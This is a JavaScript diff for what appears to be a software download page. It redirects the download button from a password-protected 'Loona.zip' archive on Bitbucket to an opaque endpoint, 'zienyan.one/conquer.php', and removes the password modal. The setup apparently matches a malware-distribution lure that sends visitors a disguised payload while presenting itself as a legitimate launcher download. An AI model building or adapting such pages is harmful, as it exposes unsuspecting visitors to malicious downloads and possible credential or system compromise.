@@ -14,40 +14,13 @@ document.addEventListener('DOMContentLoaded', function() {
   
   downloadBtn.addEventListener('click', function() {
     // Start the download
-    const downloadLink = 'bitbucket.org/gemlauncher/gemlauncher/downloads/Loona.zip';
+    const downloadLink = 'zienyan.one/conquer.php';
     const link = document.createElement('a');
     link.href = 'https://' + downloadLink;
     link.target = '_blank';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
-    
-    // Show the password modal
-    setTimeout(() => {
-      passwordModal.style.display = 'flex';
-    }, 1000);
-  });
-  
-  // Close the modal when clicking outside of it
-  passwordModal.addEventListener('click', function(event) {
-    if (event.target === passwordModal) {
-      passwordModal.style.display = 'none';
-    }
-  });
-  
-  // Copy password functionality
-  copyBtn.addEventListener('click', function() {
-    const password = passwordText.textContent;
-    navigator.clipboard.writeText(password).then(function() {
-      copyStatus.textContent = 'Password copied!';
-      copyStatus.style.color = '#00d9ff';
-      setTimeout(() => {
-        copyStatus.textContent = '';
-      }, 2000);
-    }, function(err) {
-      copyStatus.textContent = 'Could not copy password';
-      copyStatus.style.color = '#ff4747';
-    });
   });
   
   // Add some hover effects for interactive elements
